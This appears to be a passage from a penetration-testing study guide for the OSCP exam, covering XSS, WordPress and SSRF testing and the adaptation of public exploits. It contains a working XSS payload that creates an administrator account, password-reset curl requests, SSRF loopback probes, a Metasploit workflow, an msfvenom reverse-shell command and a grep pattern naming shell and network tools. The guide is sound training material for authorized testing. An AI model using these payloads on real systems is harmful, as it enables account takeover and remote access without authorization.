text: id="variant-9-3-4-3-1">9.3.4.3.1 Variant — method mismatch reveals a valid route curl -ski http://TARGET:PORT/api/v1/users/USER/password curl -ski -X OPTIONS http://TARGET:PORT/api/v1/users/USER/password curl -ski -X PUT -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"password":"NEW_PASSWORD"}' http://TARGET:PORT/api/v1/users/USER/password Use PUT/PATCH only when a 405 , Allow header, documentation or JavaScript behavior supports it. Verify the new credential through a separate login. <h2

title: 9.3.4.4 XSS: prove browser execution in the right context
text: id="xss-prove-browser-execution-in-the-right-context">9.3.4.4 XSS: prove browser execution in the right context First inject a unique text marker and inspect where it appears in raw HTML and the DOM. Then use a controlled proof appropriate to the context: Classify the path: reflected: victim must visit a crafted request; stored: payload persists and a relevant user later renders it; DOM-based: client-side code moves controlled data into an executable DOM sink. Decisive output: JavaScript executes under the expected application origin and viewer context. Reflection or HTML display alone is not XSS. Match the proof to the observed parser context rather than trying a random payload list: Observed insertion context Minimal lab proof candidate What failure means HTML element body

title: 9.3.4.5 Turn XSS into useful application privilege
text: id="turn-xss-into-useful-application-privilege">9.3.4.5 Turn XSS into useful application privilege HttpOnly prevents JavaScript from reading that cookie, but same-origin XSS may still issue authenticated requests from the victim browser. Recreate a legitimate privileged workflow and obtain its anti-CSRF value first: fetch('/admin/users/new') .then(r => r.text()) .then(t => { const token = new DOMParser().parseFromString(t, 'text/html') .querySelector('input[name="csrf"]')?.value; return fetch('/admin/users', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: new URLSearchParams({username:'NEW_USER', password:'NEW_PASSWORD', role:'administrator', csrf:token}) }); }); Prerequisites: the payload is rendered by a suitably privileged victim, under the correct origin; the paths/fields come from captured normal behavior; CSP and application logic allow execution; the action is permitted in the victim session. Verification: authenticate as NEW_USER and perform one administrator-only action. If application administration exposes a legitimate plugin/template/file-upload function, continue with web file handling and re-prove server execution. <h2

title: 9.3.4.6 Failure cues
text: id="failure-cues">9.3.4.6 Failure cues input appears encoded as <...> : output encoding worked in that context; script runs only for the tester: reflected/self-XSS without a delivery/viewer path; stored marker exists but script never runs: wrong render context, sanitization or CSP; cookie cannot be read: check HttpOnly , but do not infer that authenticated same-origin requests are blocked; privileged request returns success text but no state changes: token/field/role may be wrong; verify independently; user A reads only A's data after ID change: object-level control held in that tested context. <h2

title: 9.3.4.7 Handoffs
text: id="handoffs">9.3.4.7 Handoffs new password/token/account -> Block 5 plus authenticated Block 3 mapping; product/plugin feature requiring public code -> Block 6; admin upload/template editor -> web file handling ; verified server command execution -> Block 7; no useful viewer/action -> record XSS proof and return to higher-priority server-side inputs. <h2

title: 9.3.4.8 Sources
text: id="sources">9.3.4.8 Sources Supplied PEN-200 Ch 8.3-8.4, pp225-244; reviewed getSH Web/XSS route ; OWASP IDOR testing ; OWASP stored XSS testing .

title: 9.3.5 WordPress and SSRF Paths
text: id="wordpress-and-ssrf-paths">9.3.5 WordPress and SSRF Paths ← Stage index | HTTP mapping | Web cheatsheet | Strategy map | Study methods: Turn application weaknesses into access <h2

title: 9.3.5.1 WordPress: establish the deployment first
text: id="wordpress-establish-the-deployment-first">9.3.5.1 WordPress: establish the deployment first Recognition: WordPress-specific paths/assets, generator metadata, REST routes or wp-content . Prerequisite: correct scheme, host header and base path. Decisive output: core/plugin/theme identity or an authenticated capability that maps to a concrete prerequisite. curl -skI https://HOSTNAME/ curl -sk https://HOSTNAME/robots.txt curl -sk https://HOSTNAME/wp-json/ | head curl -sk https://HOSTNAME/wp-content/ curl -sk https://HOSTNAME/wp-login.php -o wp-login.html Inspect page source for /wp-content/plugins/NAME/ , /wp-content/themes/NAME/ , versioned assets and alternate base paths. A visible version is a candidate, not exploitability proof. <summary

title: 9.3.5.1.1 WPScan inventory
text: id="variant-9-3-5-1-1">9.3.5.1.1 WPScan inventory wpscan --url https://HOSTNAME/ --disable-tls-checks \ --enumerate vp,vt,u --plugins-detection mixed \ --output wpscan-HOSTNAME.txt WPScan can be useful for component/user candidates, but verify every useful result manually. Vulnerability-database details may require an API token ; never place a token in published notes or command history. <h2

title: 9.3.5.2 WordPress authentication and post-authentication mapping
text: id="wordpress-authentication-and-post-authentication-mapping">9.3.5.2 WordPress authentication and post-authentication mapping Validate one legitimately acquired credential and then enumerate the role/capabilities it actually grants. curl -sk -c wp.cookies -b wp.cookies \ --data-urlencode 'log=USER' \ --data-urlencode 'pwd=PASSWORD' \ --data-urlencode 'wp-submit=Log In' \ --data-urlencode 'redirect_to=https://HOSTNAME/wp-admin/' \ https://HOSTNAME/wp-login.php -D wp-login.headers curl -sk -b wp.cookies https://HOSTNAME/wp-admin/ -o wp-admin.html A redirect alone is inconclusive . Confirm an authenticated page marker and the actual role. Useful capabilities can include media upload, plugin/theme editing/installation, post editing or administrative account management; each requires separate server-side authorization and execution conditions. XML-RPC exposure is a feature clue, not automatically a vulnerability: curl -sk -X POST https://HOSTNAME/xmlrpc.php \ -H 'Content-Type: text/xml' \ --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' <h2

title: 9.3.5.3 SSRF: prove server-side fetching safely
text: id="ssrf-prove-server-side-fetching-safely">9.3.5.3 SSRF: prove server-side fetching safely Recognition: URL import, webhook, image/PDF fetch, feed preview, link unfurling or callback validation. Prerequisite: a parameter that the server dereferences. Decisive output: a request observed at a controlled listener or a stable response difference tied to the destination. Listener: python3 -m http.server LPORT --bind 0.0.0.0 Hypothetical request replay: curl -sk 'https://HOSTNAME/fetch?url=http://LHOST:LPORT/ssrf-marker' Interpret the path explicitly: browser/client -> vulnerable application -> requested URL The application, not Kali, must resolve and reach the destination. A browser-side fetch, open redirect or reflected URL does not prove SSRF. <summary

title: 9.3.5.3.1 Internal destination and parser variations
text: id="variant-9-3-5-3-1">9.3.5.3.1 Internal destination and parser variations <h3

title: 9.3.5.3.2 Only after an external controlled callback proves server-side fetching
text: id="variant-9-3-5-3-2">9.3.5.3.2 Only after an external controlled callback proves server-side fetching # Only after an external controlled callback proves server-side fetching curl -sk 'https://HOSTNAME/fetch?url=http://127.0.0.1:PORT/' curl -sk 'https://HOSTNAME/fetch?url=http://localhost:PORT/' <h3

title: 9.3.5.3.3 Preserve encoding when the URL is nested in form data
text: id="variant-9-3-5-3-3">9.3.5.3.3 Preserve encoding when the URL is nested in form data # Preserve encoding when the URL is nested in form data curl -sk -X POST https://HOSTNAME/fetch \ --data-urlencode 'url=http://127.0.0.1:PORT/' Compare status, body marker, size and timing against a closed-port control. Internal HTTP content establishes reachability/read capability, not command execution. <h2

title: 9.3.5.4 Failure-guided routing
text: id="failure-guided-routing">9.3.5.4 Failure-guided routing Callback never arrives: verify the parameter is fetched server-side, the listener address, return route, URL parser and allowed schemes. External callback works but loopback fails: destination filtering, container/network namespace or application proxying may differ. All internal ports look identical: the application may normalize errors; use a known-open/known-closed comparison and stable markers. Redirect accepted but final destination blocked: determine whether validation happens before or after redirects without assuming a bypass. WordPress scanner finds a component but the path/version is absent: manually confirm the active component and vulnerable configuration. <h2

title: 9.3.5.5 Sources
text: id="sources">9.3.5.5 Sources getSH Web route , source snapshot e1f62dd WPScan project documentation PortSwigger SSRF overview Hexdump web modules

title: 9.3.6 Public Exploit Selection and Adaptation
text: id="public-exploit-selection-and-adaptation">9.3.6 Public Exploit Selection and Adaptation ← Stage index | Shell/session procedure | Quick sheet | Strategy map | Study methods: Select and adapt public exploits ; Establish sessions and move files Purpose: turn exact product/configuration evidence into a reviewed, minimally modified exploit that proves the intended effect. A version string or CVE match is only a candidate. <h2

title: 9.3.6.1 Record the candidate
text: id="record-the-candidate">9.3.6.1 Record the candidate source URL/EDB-ID/CVE/commit: product + component + edition/build: target OS/architecture/runtime: remote or local; pre-auth or authenticated: required configuration/feature/path/credential/privilege: expected effect: exploit runtime and dependencies: hard-coded target/callback/payload assumptions: destructive or stability risk: evidence each prerequisite exists: Do not substitute a scanner label for component evidence. Check vendor/version output, application behavior, files/configuration and the exploit's own affected-version notes. Distribution backports, disabled features, authentication and mitigations can invalidate a simple version match. <h2

title: 9.3.6.2 Search narrowly
text: id="search-narrowly">9.3.6.2 Search narrowly searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" Inspect before copying: searchsploit -p EDB_ID searchsploit -x EDB_ID searchsploit -w "PRODUCT VERSION" Copy a working copy, never edit the archive in place: mkdir -p exploit-work cd exploit-work searchsploit -m EDB_ID sha256sum EXPLOIT_FILE file EXPLOIT_FILE Selection cue: prefer a readable, reputable or verified exploit whose prerequisites and outcome match the observed component. Exclude denial-of-service entries when the objective is access. A named Nmap NSE script can validate or exercise a specific known condition, but inspect it and its arguments first: nmap --script-help SCRIPT_NAME sed -n '1,240p' /usr/share/nmap/scripts/SCRIPT_NAME.nse nmap -Pn -p PORT --script SCRIPT_NAME --script-args 'ARG=VALUE' TARGET Script categories such as intrusive , exploit , brute or dos change risk and authorization requirements. A script-reported vulnerable result remains a candidate until its underlying evidence or controlled effect is validated. <summary

title: 9.3.6.2.1 Variant — source repository rather than Exploit-DB
text: id="variant-9-3-6-2-1">9.3.6.2.1 Variant — source repository rather than Exploit-DB Record and pin the exact source state: git clone REPOSITORY_URL exploit-source cd exploit-source git log -1 --format='%H %ad %s' --date=iso-strict git status --short Read the README, license, dependency files, open issues relevant to the target version and the actual execution path. A popular repository is not automatically safe or compatible. <summary

title: 9.3.6.2.2 Variant — a matching Metasploit exploit module
text: id="variant-9-3-6-2-2">9.3.6.2.2 Variant — a matching Metasploit exploit module Use only in an authorized lab or after committing the current exam's one allowed Metasploit/Meterpreter target. Even check against a target consumes that choice under the current guide. msfconsole -q search type:exploit PRODUCT CVE info MODULE_NAME use MODULE_NAME show options show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT check run Read info , verify the module's affected versions/references, select the explicit target profile and inspect every required option. A module rank or check result does not replace exact prerequisite validation or session verification. <h2

title: 9.3.6.3 Audit untrusted code before execution
text: id="audit-untrusted-code-before-execution">9.3.6.3 Audit untrusted code before execution Start with metadata and readable text: file EXPLOIT_FILE sha256sum EXPLOIT_FILE sed -n '1,240p' EXPLOIT_FILE grep -nEi 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' EXPLOIT_FILE For binaries, prefer obtaining inspectable source. If only a binary exists, treat it as a substantially higher-risk choice: file EXPLOIT_BINARY sha256sum EXPLOIT_BINARY strings -a EXPLOIT_BINARY | less objdump -f EXPLOIT_BINARY Audit for: unexpected privilege requirements on the attacking host; destructive file/process/service operations or denial of service; downloads, callbacks or telemetry to third parties; embedded credentials, tokens, commands or payloads; files written or overwritten and their cleanup behavior; hard-coded target addresses, ports, paths, virtual hosts and callback values; authentication, cookie, CSRF, redirect, TLS and proxy assumptions; target OS, architecture, runtime, library and payload assumptions; success messages that are printed without verifying the claimed effect. Safety cue: use source, a disposable environment and a clean snapshot when uncertainty remains. Do not grant sudo merely because an unknown PoC requests it. <h2

title: 9.3.6.4 Establish the runtime before changing code
text: id="establish-the-runtime-before-changing-code">9.3.6.4 Establish the runtime before changing code head -n 1 EXPLOIT_FILE python3 --version gcc --version file EXPLOIT_FILE Separate three architectures: where the exploit program itself runs; the vulnerable target process; the payload that will execute inside or on the target. A remote Python exploit may run on Kali while delivering a Windows x64 payload. A local Linux exploit normally must run on the target-compatible architecture. Compiler choice follows the produced program; payload choice follows the target execution context. <h2

title: 9.3.6.5 Python exploit workflow
text: id="python-exploit-workflow">9.3.6.5 Python exploit workflow After source review: python3 -m py_compile exploit.py python3 exploit.py --help Isolate explicit dependencies: python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt python -m pip freeze > requirements-resolved.txt Run --help only after confirming that module import and argument handling do not trigger the exploit. Old Python 2 syntax, str / bytes mistakes, renamed modules and obsolete TLS dependencies are runtime problems, not target evidence. Useful diagnostics: python3 -X dev exploit.py ARGUMENTS python3 -m trace --trace exploit.py ARGUMENTS Use tracing only when its output is bounded and does not expose credentials. Prefer adding a few prints around the failing request/parser over changing many lines at once. <h2

title: 9.3.6.6 Compile reviewed source
text: id="compile-reviewed-source">9.3.6.6 Compile reviewed source Linux/ELF program: gcc -Wall -Wextra exploit.c -o exploit file exploit ldd exploit sha256sum exploit 32-bit output requires matching headers/libraries: gcc -m32 -Wall -Wextra exploit.c -o exploit32 file exploit32 Windows PE from Kali: i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe file exploit-x86.exe exploit-x64.exe Windows socket code commonly needs the Winsock import library: i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32 x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32 Failure cue: undefined references are linker evidence. Identify the missing symbol and documented library; do not delete calls until the binary compiles. Exec format error means the produced format/architecture cannot run in the current environment. <h2

title: 9.3.6.7 Make the smallest supported edit
text: id="make-the-smallest-supported-edit">9.3.6.7 Make the smallest supported edit Change one assumption at a time and retain a diff: cp EXPLOIT_FILE EXPLOIT_FILE.orig git diff --no-index -- EXPLOIT_FILE.orig EXPLOIT_FILE Typical adaptations are: Assumption Evidence-backed edit Target address/port Observed reachable endpoint HTTP/HTTPS and base path Reproduced application request Virtual host or Host header Resolved application identity Username/password/cookie Valid Block 5 authentication context CSRF/session parsing Actual request/response sequence LHOST/LPORT Address and listener reachable from the target context Command or payload Target OS, interpreter, architecture, size and bad-character constraints File path/name Writable/executable target path and application behavior Timeout/retry Measured service behavior, not blind delay inflation Do not combine prerequisite repair, payload replacement and parser rewrites in one unreviewable change. <h2

title: 9.3.6.8 Repair a web exploit from the real transaction
text: id="repair-a-web-exploit-from-the-real-transaction">9.3.6.8 Repair a web exploit from the real transaction Before changing the script, reproduce the relevant request with Burp or curl and compare: curl -i -X METHOD 'SCHEME://HOSTNAME:PORT/PATH' \ -H 'Host: HOSTNAME' \ -H 'Cookie: COOKIE' \ --data 'PARAM=VALUE' For a scoped lab with a known self-signed certificate: curl -k -i 'https://HOSTNAME:PORT/PATH' In Python Requests, use a session when cookies or defaults must persist: with requests.Session() as session: response = session.get(url, timeout=10) print(response.status_code, response.url) print(response.headers) print(response.text[:500]) Set verify=False only for a scoped test after confirming the certificate problem; it disables certificate and hostname validation. Prefer a supplied CA bundle when possible. Parser cue: IndexError , missing-key and regular-expression failures mean the received response did not have the assumed shape. Print status, final URL, headers and a bounded body fragment before rewriting the parser. Common causes are a changed path, redirect, failed login, CSRF change, error page, proxy/WAF response or certificate handling. <h2

title: 9.3.6.9 Adapt an existing memory-corruption PoC only as required
text: id="adapt-an-existing-memory-corruption-poc-only-as-required">9.3.6.9 Adapt an existing memory-corruption PoC only as required Dedicated overflow development, offset drills and shellcode development are excluded from this speedrun. Use this section only to understand and adapt an existing PoC whose vulnerable build and assumptions are supported by evidence. Review the PoC comments and code for: exact vulnerable build and target architecture; hard-coded target/callback address and port; return address/module assumptions and target profiles; recorded offset, available payload space and bad characters; payload architecture, type and exit behavior; crash/restart and reliability expectations. Replace an embedded payload only when the PoC documents its constraints: msfvenom -p windows/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f c -v payload \ -b '\x00\x0a\x0d' Use the PoC's actual bad-character and space requirements; the example list is not universal. A changed build, missing module, mitigation or misaligned offset invalidates the PoC and should not trigger a fresh exploit-development detour in this route. <h2

title: 9.3.6.10 Prove effects in increasing order
text: id="prove-effects-in-increasing-order">9.3.6.10 Prove effects in increasing order exact prerequisites → exploit reaches expected vulnerable path → bounded harmless effect or identity output → repeatable command execution → payload reaches listener → usable session → verified host/identity/privilege/network position Do not accept the exploit's own “success” string as proof. Validate an independent effect. An HTTP 200 , uploaded filename, connection or application crash each proves less than a verified command result. <h2

title: 9.3.6.11 Failure routing
text: id="failure-routing">9.3.6.11 Failure routing Symptom Interpretation / next action No matching candidate Improve component/build/configuration evidence; do not force a generic CVE PoC requests suspicious local privilege Stop and audit or use an isolated snapshot Import/module error Reproduce dependencies in a per-tool environment Python syntax/bytes error Resolve runtime-version compatibility before judging the target Compiler error Fix source/header/type problem named by compiler Undefined reference Link the documented library; inspect linker order Exec format error Correct producer/consumer OS or architecture TLS/certificate failure Confirm correct HTTPS endpoint; use CA or scoped test override Redirect/login/CSRF parser failure Compare the real browser request and response state Exploit says success but effect absent Treat as unconfirmed; inspect its success condition and target response Target crashes Record stability risk; stop repeating without changed evidence Command execution works but no callback Enter the shell/session diagnostic ladder <h2

title: 9.3.6.12 Handoff and evidence
text: id="handoff-and-evidence">9.3.6.12 Handoff and evidence Record the original URL/EDB-ID/CVE/commit, original hash, exact target prerequisites, dependency/compiler state, modified diff, shellcode-generation command if applicable, invocation, raw result and independent verification. The current exam guide requires the original URL, modified code, highlighted changes and explanations when a public exploit is modified. Once command execution is proven, continue with shells and payloads . Do not make exploit adaptation carry listener, route and TTY problems that belong to the session layer. The current OSCP+ guide restricts Metasploit Auxiliary/Exploit/Post modules and Meterpreter to one selected target; selection is consumed even when the attempt or check fails. msfvenom and multi/handler have across-target exceptions, subject to the Meterpreter limit. AI chatbots are prohibited during the actual exam. <h2

title: 9.3.6.13 Component/CVE lookup from the source cheatsheet
text: id="componentcve-lookup-from-the-source-cheatsheet">9.3.6.13 Component/CVE lookup from the source cheatsheet Use this lookup when enumeration identifies the relevant component. These are candidate/advisory links, not confirmation from a banner. Check the vendor/distribution patch status, exact feature, access and PoC behavior before following the existing adaptation workflow. CVE-2021-42287 — AD/ KDC patch state and the account-creation/object-name prerequisites of the selected NoPac chain. CVE record . CVE-2021-44228 — The actual Java logging path, affected Log4j component and reachable JNDI/callback context; a DNS hit alone is not RCE. CVE record . CVE-2022-0847 — Affected Linux kernel and writable-page-cache primitive; confirm build/backports before a Dirty Pipe PoC. CVE record . Match the actual product/feature/build, then inspect the original script with the runtime/argument checks above. The bundled payload binaries and precompiled helpers are not automatically the correct architecture/runtime or a trustworthy build for your target. 0xsyr0 exploit files · Source CVE recipes BadSuccessor/dMSA and container-escape examples have additional object/platform/configuration requirements. Treat them as conditional candidates when those exact features are observed, rather than default steps after obtaining any domain identity or container shell.
